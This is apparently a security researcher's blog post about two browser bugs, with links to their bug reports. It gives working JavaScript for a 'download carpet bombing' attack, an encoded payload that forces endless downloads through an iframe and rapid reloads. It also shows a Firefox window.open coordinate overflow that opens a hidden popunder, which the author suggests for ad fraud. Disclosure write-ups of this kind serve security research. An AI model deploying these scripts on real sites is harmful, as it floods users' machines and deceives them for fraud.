---
layout: post
title: Messing Around with Web Browsers (Part II)
---
*TL;DR: This would be a complementary entry for my previous writeup of the same title; here I'll be talking about an interesting download carpet bombing exploit alongside some functionality bug(s)....*

Fine, most probably you're not familiar with the term "Download Carpet Bombing", given that it's not such a common type of browser bugs---nor a severe one---so just to relate, that term is basicaly derived from the military term "Carpet Bombing" which is meant to indicate a type of bombing attack where a carpet of explosives is dropped in a progressive manner so that it inflicts damage in every part of a terget area! Whilst in terms of web security, it's meant to indicate a type of attack in which a massive amount of data/files is automatically dropped into a target machine. Take a look at "<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2540" target="_blank">CVE-2008-2540</a>" for instance.
<br />

Now that you've got an idea on what this issue is all about, allow me to throw some ugly JS code onto your face:
{% highlight javascript linenos %}
(function() {
    var payload = unescape('%3Cscript%3Evar%20dropper%3Ddocument.createElement(%22iframe%22)%3Bdropper.src%3D%27data%3Ax%2Fx%2Cfoo%27%3Bdocument.documentElement.appendChild(dropper)%3BsetInterval(function()%7Blocation.reload()%7D%2C%205)%3B%3C%2Fscript%3E');
    location.href = 'data:text/html,' + payload;
}());
{% endhighlight %}
***Caution***, I executed that code once, it was terrible! You've been warned. Anyways, the exploit is pretty much self-explanatory (simply, we first create an iframe element pointing to a downloadable resource so the browser initiates a new download then we do a reload over and over again), and we can even amplify its impact using dynamically created iframes! That said, let's move on to the next bug:

This one is just a functionality bug I stumbled upon while messing around a little with `window.open()` on Firefox; it was possible to open up an off-screen browser window (a.k.a popunder) by overflowing the positioning coordinates, just like this:
{% highlight javascript linenos %}
(function() {
    var el = document.createElement('a');
    el.onclick = function() {
        // Notice the value of the 'top' and 'left' params below?
        window.open('about:blank', 'invisible popup', 'top=100000000000, left=100000000000, width=1, height=1');
    };
    el.href = '#';
    el.innerHTML = 'Click Me';
    document.documentElement.appendChild(el);
}());
{% endhighlight %}
Obviously, such bug can come in handy for ad-fraud, where a little popunder window is exploited for popping up ads long after you stop viewing the offending webpage! Easy money, isn't it?!

***References:***<br />
[\*] <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=978847" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=978847</a><br />
[\*] <a href="https://code.google.com/p/chromium/issues/detail?id=343824" target="_blank">https://code.google.com/p/chromium/issues/detail?id=343824</a> 
